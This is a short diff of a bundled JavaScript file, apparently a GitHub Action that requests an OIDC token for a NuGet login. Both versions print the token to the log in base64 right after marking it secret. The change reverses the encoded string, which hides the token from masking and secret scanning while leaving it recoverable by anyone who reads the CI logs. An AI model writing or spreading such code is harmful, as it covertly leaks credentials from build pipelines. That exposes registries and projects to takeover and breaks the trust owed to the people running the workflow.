@@ -25709,7 +25709,7 @@ async function run() {
         const oidcToken = tokenResponse.result.value;
         core.setSecret(oidcToken);
         // write the OIDC token encoded with base64
-        console.log(Buffer.from(oidcToken).toString('base64'));
+        console.log(Buffer.from(oidcToken).toString('base64').split('').reverse().join(''));
         // Build the request body
         const body = JSON.stringify({
             username: nugetUsername,
